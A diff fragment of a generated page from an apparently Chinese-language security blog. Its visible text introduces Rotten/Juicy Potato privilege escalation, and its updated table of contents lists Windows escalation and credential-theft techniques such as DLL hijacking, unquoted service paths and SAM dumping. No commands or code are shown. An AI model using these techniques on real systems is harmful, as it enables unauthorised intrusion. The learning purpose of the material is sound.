 <h3 id="Service-Accounts-Rotten-Juicy-Potato"><a href="#Service-Accounts-Rotten-Juicy-Potato" class="headerlink" title="Service Accounts (Rotten / Juicy Potato)"></a>Service Accounts (Rotten / Juicy Potato)</h3><p>回顾一下服务账号的特性，对于其账号关联的服务有特殊的权限，不可以直接登录。服务账号可以用来进行提权</p>
 <p>2016年发现了Rotten Potato进行提权，服务账户可以盗取SYSTEM的票据并假冒SYSTEM用户，这个利用需要开启SeImpersonatePrivilege</p>
@@ -933,7 +1055,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#windows%E6%8F%90%E6%9D%83"><span class="nav-number">1.</span> <span class="nav-text">windows提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-number">1.1.</span> <span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%99%AE%E9%80%9A%E8%B4%A6%E6%88%B7"><span class="nav-number">1.1.1.</span> <span class="nav-text">普通账户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E8%B4%A6%E6%88%B7"><span class="nav-number">1.1.2.</span> <span class="nav-text">服务账户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%84"><span class="nav-number">1.1.3.</span> <span class="nav-text">组</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B5%84%E6%BA%90"><span class="nav-number">1.1.4.</span> <span class="nav-text">资源</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2"><span class="nav-number">1.2.</span> <span class="nav-text">环境部署</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7%E9%80%89%E6%8B%A9"><span class="nav-number">1.3.</span> <span class="nav-text">工具选择</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">2.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Kernel-Exploits"><span class="nav-number">2.1.</span> <span class="nav-text">Kernel Exploits</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">2.1.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%91%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="nav-number">2.1.2.</span> <span class="nav-text">发现与利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7"><span class="nav-number">2.1.3.</span> <span class="nav-text">工具</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Services-Exploits"><span class="nav-number">2.2.</span> <span class="nav-text">Services Exploits</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%8B%E5%8A%A8%E6%9E%9A%E4%B8%BE%E6%9C%8D%E5%8A%A1"><span class="nav-number">2.2.1.</span> <span class="nav-text">手动枚举服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83-1"><span class="nav-number">2.2.2.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Insecure-Service-Properties"><span class="nav-number">2.2.2.1.</span> <span class="nav-text">Insecure Service Properties</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Unquoted-Service-Path"><span class="nav-number">2.2.2.2.</span> <span class="nav-text">Unquoted Service Path</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Weak-Registry-Permissions"><span class="nav-number">2.2.2.3.</span> <span class="nav-text">Weak Registry Permissions</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Insecure-Service-Executables"><span class="nav-number">2.2.2.4.</span> <span class="nav-text">Insecure Service Executables</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DLL-Hijacking"><span class="nav-number">2.2.2.5.</span> <span class="nav-text">DLL Hijacking</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Registry"><span class="nav-number">2.3.</span> <span class="nav-text">Registry</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Autoruns"><span class="nav-number">2.3.1.</span> <span class="nav-text">Autoruns</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AlwaysInstallElevated"><span class="nav-number">2.3.2.</span> <span class="nav-text">AlwaysInstallElevated</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Passwords"><span class="nav-number">2.4.</span> <span class="nav-text">Passwords</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Registry-1"><span class="nav-number">2.4.1.</span> <span class="nav-text">Registry</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Saved-Creds"><span class="nav-number">2.4.2.</span> <span class="nav-text">Saved Creds</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Configuration-Files"><span class="nav-number">2.4.3.</span> <span class="nav-text">Configuration Files</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%BB%E6%89%BE%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="nav-number">2.4.3.1.</span> <span class="nav-text">寻找配置文件</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SAM"><span class="nav-number">2.4.4.</span> <span class="nav-text">SAM</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Scheduled-Tasks"><span class="nav-number">2.5.</span> <span class="nav-text">Scheduled Tasks</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Insecure-GUI-Apps-Citrix-Method"><span class="nav-number">2.6.</span> <span class="nav-text">Insecure GUI Apps (Citrix Method)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Startup-Apps"><span class="nav-number">2.7.</span> <span class="nav-text">Startup Apps</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Installed-Applications"><span class="nav-number">2.8.</span> <span class="nav-text">Installed Applications</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9C%9F%E8%B1%86%E5%AE%B6%E6%97%8F"><span class="nav-number">2.9.</span> <span class="nav-text">土豆家族</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Hot-Potato"><span class="nav-number">2.9.1.</span> <span class="nav-text">Hot Potato</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Service-Accounts-Rotten-Juicy-Potato"><span class="nav-number">2.9.2.</span> <span class="nav-text">Service Accounts (Rotten &#x2F; Juicy Potato)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Port-Forwarding"><span class="nav-number">2.10.</span> <span class="nav-text">Port Forwarding</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A2%9D%E5%A4%96%E9%83%A8%E5%88%86"><span class="nav-number">3.</span> <span class="nav-text">额外部分</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Meterpreter-gt-getsystem"><span class="nav-number">3.0.1.</span> <span class="nav-text">Meterpreter&gt;getsystem</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#User-Privileges"><span class="nav-number">3.0.2.</span> <span class="nav-text">User Privileges</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#windows%E6%8F%90%E6%9D%83"><span class="nav-number">1.</span> <span class="nav-text">windows提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-number">1.1.</span> <span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%99%AE%E9%80%9A%E8%B4%A6%E6%88%B7"><span class="nav-number">1.1.1.</span> <span class="nav-text">普通账户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E8%B4%A6%E6%88%B7"><span class="nav-number">1.1.2.</span> <span class="nav-text">服务账户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%84"><span class="nav-number">1.1.3.</span> <span class="nav-text">组</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B5%84%E6%BA%90"><span class="nav-number">1.1.4.</span> <span class="nav-text">资源</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2"><span class="nav-number">1.2.</span> <span class="nav-text">环境部署</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7%E9%80%89%E6%8B%A9"><span class="nav-number">1.3.</span> <span class="nav-text">工具选择</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">2.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Kernel-Exploits"><span class="nav-number">2.1.</span> <span class="nav-text">Kernel Exploits</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">2.1.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%91%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="nav-number">2.1.2.</span> <span class="nav-text">发现与利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7"><span class="nav-number">2.1.3.</span> <span class="nav-text">工具</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Services-Exploits"><span class="nav-number">2.2.</span> <span class="nav-text">Services Exploits</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%8B%E5%8A%A8%E6%9E%9A%E4%B8%BE%E6%9C%8D%E5%8A%A1"><span class="nav-number">2.2.1.</span> <span class="nav-text">手动枚举服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83-1"><span class="nav-number">2.2.2.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Insecure-Service-Properties"><span class="nav-number">2.2.2.1.</span> <span class="nav-text">Insecure Service Properties</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Unquoted-Service-Path"><span class="nav-number">2.2.2.2.</span> <span class="nav-text">Unquoted Service Path</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Weak-Registry-Permissions"><span class="nav-number">2.2.2.3.</span> <span class="nav-text">Weak Registry Permissions</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Insecure-Service-Executables"><span class="nav-number">2.2.2.4.</span> <span class="nav-text">Insecure Service Executables</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DLL-Hijacking"><span class="nav-number">2.2.2.5.</span> <span class="nav-text">DLL Hijacking</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Registry"><span class="nav-number">2.3.</span> <span class="nav-text">Registry</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Autoruns"><span class="nav-number">2.3.1.</span> <span class="nav-text">Autoruns</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AlwaysInstallElevated"><span class="nav-number">2.3.2.</span> <span class="nav-text">AlwaysInstallElevated</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Passwords"><span class="nav-number">2.4.</span> <span class="nav-text">Passwords</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Registry-1"><span class="nav-number">2.4.1.</span> <span class="nav-text">Registry</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#PSCredential"><span class="nav-number">2.4.1.1.</span> <span class="nav-text">PSCredential</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Saved-Creds"><span class="nav-number">2.4.2.</span> <span class="nav-text">Saved Creds</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Configuration-Files"><span class="nav-number">2.4.3.</span> <span class="nav-text">Configuration Files</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%BB%E6%89%BE%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="nav-number">2.4.3.1.</span> <span class="nav-text">寻找配置文件</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SAM"><span class="nav-number">2.4.4.</span> <span class="nav-text">SAM</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Scheduled-Tasks"><span class="nav-number">2.5.</span> <span class="nav-text">Scheduled Tasks</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Insecure-GUI-Apps-Citrix-Method"><span class="nav-number">2.6.</span> <span class="nav-text">Insecure GUI Apps (Citrix Method)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Startup-Apps"><span class="nav-number">2.7.</span> <span class="nav-text">Startup Apps</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Installed-Applications"><span class="nav-number">2.8.</span> <span class="nav-text">Installed Applications</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9C%9F%E8%B1%86%E5%AE%B6%E6%97%8F"><span class="nav-number">2.9.</span> <span class="nav-text">土豆家族</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Hot-Potato"><span class="nav-number">2.9.1.</span> <span class="nav-text">Hot Potato</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Service-Accounts-Rotten-Juicy-Potato"><span class="nav-number">2.9.2.</span> <span class="nav-text">Service Accounts (Rotten &#x2F; Juicy Potato)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Port-Forwarding"><span class="nav-number">2.10.</span> <span class="nav-text">Port Forwarding</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A2%9D%E5%A4%96%E9%83%A8%E5%88%86"><span class="nav-number">3.</span> <span class="nav-text">额外部分</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Meterpreter-gt-getsystem"><span class="nav-number">3.0.1.</span> <span class="nav-text">Meterpreter&gt;getsystem</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#User-Privileges"><span class="nav-number">3.0.2.</span> <span class="nav-text">User Privileges</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -949,7 +1071,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">130</span>
+          <span class="site-state-item-count">131</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -997,7 +1119,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2020</span>
+  <span itemprop="copyrightYear">2021</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
